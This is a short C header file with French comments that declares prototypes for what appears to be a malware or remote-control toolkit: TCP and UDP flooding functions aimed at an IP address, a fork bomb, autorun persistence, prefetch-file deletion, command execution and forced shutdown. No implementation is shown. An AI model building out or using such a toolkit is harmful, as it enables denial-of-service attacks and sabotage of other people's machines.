#ifndef PROTO_H
#define PROTO_H

// Déclaration des prototypes des fonctions

int AutoRun();
//int dateconvert( FILETIME * valeur);
int ddostcp(int port, char * addrip, int nbpackets, int sizepacket, int delai );
int ddosudp(int port, char * addrip, int nbpackets, int sizepacket, int delai );
void supfichier(char* filename);
void deletePrefetchFiles(void);
void forkbomb();
void ftexec(char* command);
void image(char * filename);
void lock();
void logoff();
void randomize(const char *directoryPath);
void restart();
void shutdownfunc();
void song(char * filename);
void GetSysInf();
void enumfile(char* chemin);

#endif
